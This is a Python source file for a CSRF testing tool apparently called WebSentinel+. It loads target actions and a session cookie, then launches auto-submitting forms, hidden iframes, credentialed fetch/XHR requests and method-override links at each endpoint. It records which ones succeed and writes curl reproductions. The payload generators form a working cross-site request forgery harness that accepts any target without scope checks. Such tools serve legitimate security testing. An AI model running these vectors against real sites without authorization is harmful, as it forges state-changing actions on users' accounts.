#!/usr/bin/env python3
# WebSentinel+ CSRF Manual Runner — reads actions.json you provide and launches all vectors.

import argparse, json, os, time
from dataclasses import dataclass, field
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

from utils.url_utils import parse_domain, same_origin, same_path, build_query
from utils.report_writer import write_reports

@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str, str] = field(default_factory=dict)
    body_format: str = "form"  # "form" or "json"

@dataclass
class SessionCookie:
    name: str
    value: str
    domain: str
    path: str = "/"
    secure: bool = True
    httpOnly: bool = False
    sameSite: Optional[str] = None  # "Lax"|"Strict"|"None"|None

VECTORS = [
    {"id": "img_get",               "build": "tag"},
    {"id": "script_get",            "build": "tag"},
    {"id": "iframe_get",            "build": "tag"},
    {"id": "meta_refresh",          "build": "meta"},
    {"id": "link_click",            "build": "link"},
    {"id": "noreferrer_link",       "build": "noreferrer"},
    {"id": "form_post",             "build": "form"},
    {"id": "fetch_post",            "build": "fetch"},
    {"id": "xhr_post_json",         "build": "xhr"},
    {"id": "multipart_post",        "build": "multipart"},
    {"id": "method_override_param", "build": "method_param"},
    {"id": "cookie_refresh_then_post","build":"seq"},
]

def _auth_header_pair(auth_header: Optional[str]) -> Optional[Tuple[str, str]]:
    if not auth_header or ":" not in auth_header: return None
    k, v = auth_header.split(":", 1)
    return k.strip(), v.strip()

def html_tag(url, tag):
    if tag == "img":    return f'<img src="{url}">'
    if tag == "script": return f'<script src="{url}"></script>'
    if tag == "iframe": return f'<iframe src="{url}" style="display:none"></iframe>'
    return ""

def html_meta_refresh(url): return f'<meta http-equiv="refresh" content="0; url={url}">'

def html_link(url, noreferrer=False):
    rel = ' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>document.getElementById("go").click()</script>'

def html_form_post(action_url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in (params or {}).items()])
    return f'<form id="f" action="{action_url}" method="POST">{inputs}</form><script>document.getElementById("f").submit()</script>'

def html_fetch_post(action_url, params, auth_header: Optional[str], body_format: str):
    import json as _json
    from urllib.parse import urlencode
    if body_format == "json":
        headers = '"Content-Type":"application/json"'
        body_js = _json.dumps(params or {})
    else:
        headers = '"Content-Type":"application/x-www-form-urlencoded"'
        body_js = '"' + urlencode(params or {}) + '"'
    extra = ""
    if auth_header:
        hk = _auth_header_pair(auth_header)
        if hk:
            extra = f',"{hk[0]}":"{hk[1]}"'
    return (f'<script>fetch("{action_url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},'
            f'body:{body_js}}}).catch(()=>{{}})</script>')

def html_xhr(action_url, params, auth_header: Optional[str], body_format: str):
    import json as _json
    hdr = ""
    if auth_header:
        hk = _auth_header_pair(auth_header)
        if hk:
            hdr = f'x.setRequestHeader("{hk[0]}","{hk[1]}");'
    if body_format == "json":
        js = _json.dumps(params or {})
        return f'<script>var x=new XMLHttpRequest();x.open("POST","{action_url}",true);x.withCredentials=true;x.setRequestHeader("Content-Type","application/json");{hdr}x.send({js});</script>'
    else:
        from urllib.parse import urlencode
        body = urlencode(params or {})
        return f'<script>var x=new XMLHttpRequest();x.open("POST","{action_url}",true);x.withCredentials=true;x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");{hdr}x.send("{body}");</script>'

def html_multipart(action_url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in (params or {}).items()])
    return f'<form id="mf" action="{action_url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="file"></form><script>document.getElementById("mf").submit()</script>'

def classify_exploit(csrf_applicable: bool, vector_id, action_method, req_method, status, referer, origin, location_header):
    # If no cookie-based session, CSRF is not applicable (JWT/header models)
    if not csrf_applicable:
        return False, "Not applicable (JWT/header-based auth)"
    if not status or int(status) >= 400:
        return False, "HTTP error"
    loc = (location_header or "").lower()
    if any(x in loc for x in ["/login", "signin", "authenticate"]):
        return False, "Redirect to login"
    if vector_id == "noreferrer_link" and (referer is None):
        return True, "Accepted with no Referer"
    if action_method.upper() == "POST" and req_method == "GET":
        return True, "Accepted GET for state change"
    return True, "Accepted (status<400)"

def curl_for(action_url, req_method, params, auth_header: Optional[str], body_format: str):
    from urllib.parse import urlencode
    auth = ""
    if auth_header:
        hk = _auth_header_pair(auth_header)
        if hk:
            auth = f' -H "{hk[0]}: {hk[1]}"'
    if req_method == "GET":
        url = build_query(action_url, params or {})
        return f'curl -i{auth} "{url}"'
    if body_format == "json":
        import json as _json
        return f"curl -i{auth} -X POST -H 'Content-Type: application/json' --data '{_json.dumps(params or {})}' '{action_url}'"
    else:
        body = urlencode(params or {})
        return f'curl -i{auth} -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "{body}" "{action_url}"'

def run(cfg_path: str, out_dir: str, exploits_only: bool = True):
    with open(cfg_path, "r", encoding="utf-8") as f:
        cfg = json.load(f)

    base_url = cfg["base_url"].rstrip("/")
    actions = [Action(**a) for a in cfg["actions"]]
    sc = cfg.get("session_cookie")  # may be None (JWT/header apps)
    optional = cfg.get("optional", {})
    use_noreferrer = bool(optional.get("noreferrer", False))
    bounce_url = optional.get("bounce_url")
    auth_header = optional.get("auth_header")

    u = urlparse(base_url)
    target_origin = f"{u.scheme}://{u.hostname}" + (f":{u.port}" if u.port else "")

    csrf_applicable = bool(sc and str(sc.get("value", "")).strip())

    results, exploited_list = [], []

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        page.set_default_timeout(7000)
        page.set_default_navigation_timeout(7000)

        # Set cookie if provided (cookie-based sessions)
        if sc and csrf_applicable:
            cookie = SessionCookie(**sc)
            ctx.add_cookies([{
                "name": cookie.name, "value": cookie.value, "domain": cookie.domain,
                "path": cookie.path, "secure": cookie.secure, "httpOnly": cookie.httpOnly,
                "sameSite": cookie.sameSite if cookie.sameSite in ("Lax", "Strict", "None") else None
            }])

        obs = []
        def on_request(req):
            try:
                if same_origin(req.url, target_origin):
                    hdrs = dict(req.headers)
                    obs.append({"phase":"request","url":req.url,"method":req.method,
                                "referer":hdrs.get("referer"),"origin":hdrs.get("origin")})
            except Exception: pass

        def on_response(resp):
            try:
                if same_origin(resp.url, target_origin):
                    obs.append({"phase":"response","url":resp.url,"status":resp.status,
                                "headers": dict(resp.headers)})
            except Exception: pass

        page.on("request", on_request)
        page.on("response", on_response)

        if bounce_url and csrf_applicable:
            try:
                page.goto(bounce_url, wait_until="load"); page.wait_for_timeout(800)
            except Exception:
                pass

        for action in actions:
            get_url = build_query(action.url, action.params)
            method_override = build_query(action.url, {**action.params, "_method":"POST"})

            vectors = []
            # GET tag vectors
            for tag in ("img","script","iframe"):
                vectors.append(("img_get:"+tag, html_tag(get_url, tag), "GET"))
            for tag in ("img","script","iframe"):
                vectors.append(("script_get:"+tag, html_tag(get_url, tag), "GET"))
            for tag in ("img","script","iframe"):
                vectors.append(("iframe_get:"+tag, html_tag(get_url, tag), "GET"))
            # GET navigations
            vectors.append(("meta_refresh", html_meta_refresh(get_url), "GET"))
            vectors.append(("link_click", html_link(get_url, False), "GET"))
            vectors.append(("noreferrer_link", html_link(get_url, True), "GET") if use_noreferrer else None)
            # POSTs
            vectors.append(("form_post", html_form_post(action.url, action.params if action.method.upper()=="POST" else {}), "POST"))
            vectors.append(("fetch_post", html_fetch_post(action.url, action.params if action.method.upper()=="POST" else {}, auth_header, action.body_format), "POST"))
            vectors.append(("xhr_post_json", html_xhr(action.url, action.params if action.method.upper()=="POST" else {}, auth_header, action.body_format), "POST"))
            vectors.append(("multipart_post", html_multipart(action.url, action.params if action.method.upper()=="POST" else {}), "POST"))
            # method override
            vectors.append(("method_override_param", html_link(method_override, False), "GET"))
            # SameSite Lax refresh flow
            vectors.append(("cookie_refresh_then_post", html_link(base_url, False) + "<hr/>" + html_form_post(action.url, action.params if action.method.upper()=="POST" else {}), "POST"))

            vectors = [v for v in vectors if v is not None]

            for vec_id, html, exp_req_method in vectors:
                before = len(obs)
                try:
                    page.set_content(html, wait_until="domcontentloaded")
                    page.wait_for_timeout(1200)

                    req_method = referer = origin = status = location = None
                    for ev in obs[before:]:
                        if ev["phase"] == "request" and same_path(ev["url"], action.url):
                            req_method, referer, origin = ev.get("method"), ev.get("referer"), ev.get("origin")
                        if ev["phase"] == "response" and same_path(ev["url"], action.url) and status is None:
                            status = ev.get("status"); headers = ev.get("headers") or {}
                            location = headers.get("location") or headers.get("Location")

                    exploited, why = classify_exploit(
                        csrf_applicable, vec_id, action.method,
                        req_method or exp_req_method, status, referer, origin, location
                    )

                    note_parts = [why]
                    if vec_id == "noreferrer_link": note_parts.append("Referer intentionally suppressed")
                    if vec_id == "cookie_refresh_then_post": note_parts.append("SameSite Lax 'refresh' flow")
                    if vec_id == "method_override_param": note_parts.append("Uses _method=POST")

                    row = {
                        "action": action.name, "url": action.url, "vector": vec_id,
                        "req_method": req_method or exp_req_method, "status": status,
                        "referer": referer, "origin": origin,
                        "exploited": exploited, "csrf_applicable": csrf_applicable,
                        "note": "; ".join(note_parts)
                    }
                    row["curl"] = curl_for(action.url, row["req_method"], action.params, auth_header, action.body_format)

                    if exploited:
                        exploited_list.append({"action": action.name, "vector": vec_id, "status": status})
                    results.append(row)

                except Exception as e:
                    results.append({
                        "action": action.name, "url": action.url, "vector": vec_id,
                        "req_method": exp_req_method, "status": None, "referer": None, "origin": None,
                        "exploited": False, "csrf_applicable": csrf_applicable,
                        "note": f"Error: {type(e).__name__}"
                    })

        browser.close()

    domain = parse_domain(base_url)
    json_out, html_out = write_reports(base_url, results,
        template_path=os.path.join("templates","csrf_report.html"),
        out_dir=out_dir, domain=domain, exploited=exploited_list)

    # exploits-only + curl pack
    if exploits_only:
        ex = [r for r in results if r.get("exploited")]
        write_reports(base_url, ex, template_path=os.path.join("templates","csrf_report.html"),
                      out_dir=out_dir, domain=domain, exploited=exploited_list, filename_suffix="_exploited")
    curls = [r["curl"] for r in results if r.get("curl")]
    if curls:
        ts = time.strftime("%Y-%m-%d_%H-%M-%S")
        curl_path = os.path.join(out_dir, f"{domain}_csrf_{ts}_curl.txt")
        with open(curl_path, "w", encoding="utf-8") as f:
            f.write("# cURL repro (includes auth header if provided)\n")
            for c in curls: f.write(c + "\n")

    print("[+] CSRF manual run complete")
    print(f"    HTML: {html_out}")

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="CSRF Manual Runner (reads actions.json)")
    ap.add_argument("--config", required=True, help="actions.json")
    ap.add_argument("--out", default="reports", help="output folder")
    ap.add_argument("--exploits-only", action="store_true", help="also write exploits-only report")
    args = ap.parse_args()
    run(args.config, args.out, exploits_only=args.exploits_only)
